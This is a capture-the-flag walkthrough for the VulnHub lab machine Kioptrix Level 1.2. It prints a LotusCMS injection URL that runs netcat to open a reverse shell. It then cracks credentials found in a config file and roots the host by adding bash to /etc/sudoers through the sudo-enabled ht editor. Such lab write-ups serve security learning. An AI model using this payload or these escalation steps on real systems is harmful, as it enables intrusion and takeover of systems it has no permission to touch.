# Kioptrix: Level 1.2 

- [Tools](#tools)
- [Gaining Access](#gaining-access)
- [Priviledge Escalation](#priviledge-escalation)

Machine: [https://www.vulnhub.com/entry/kioptrix-level-12-3,24/](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/)

## Tools

- [NMap](https://NMap.org)
- dirb
- Netcat

## Gaining Access

- Got IP with netdiscover, in my case IP is 192.168.0.13. At first as usual scanned with nmap.
- Running dirb gives us some links.
- If we open the ip there is a website. 
- If we click on login, we can get login panel powered by LotusCMS.
- If we google `LotusCMS RCE exploit`. We can find many exploits to get RCE. So, I studied the exploit and crafted a payload for reverse shell. Opening the crafted link gives reverse shell. `http://192.168.0.13/index.php?page=index%27)%3B%24{system(%27nc+-e+%2Fbin%2Fsh+<ip address>+<port number>%27)}%3B%23` while listening on netcat if we open that link we will get a reverse shell.

## Priviledge Escalation

- After some searching, I got some credentials inside `/home/www/kioptrix3.com/gallery/gconfig.php`.
- We can use this credential on a previously found link using dirb `http://192.168.0.13/phpmyadmin/`. 
- After logging in we get two username and hash inside database.
- So, if we decrypt those hash using crackstation, we get password of `dreg` is `Mast3r` and pasword of `loneferret` is `starwars`.
- We can get ssh using those credentials. As dreg I got nothing important. So, I tried `loneferret` and `sudo` is enabled there and got some `sudo binary`.
- `su` is not exploitable as user `loneferret`, so I tried to exploit `ht` and to exploit `ht` I need to `export TERM=xterm`.
- Now I found this article https://vk9-sec.com/ht-privilege-escalation/ and followed these simple steps to root. So, at first I opened `sudo ht` and then pressed `F3` to select `/etc/sudoers` to open.
- Now added `/bin/bash` to sudoers as instructed in the article and saved the file with `F2` and quit with `F10` or `CTRL+C`.
- Now just use `sudo /bin/bash` to get root shell.
- Now we can find a file `Congrats.txt` inside `/root` directory and this is the flag file containing a big paragraph.

Author: [Zishan Ahamed Thandar](https://ZishanAdThandar.github.io)
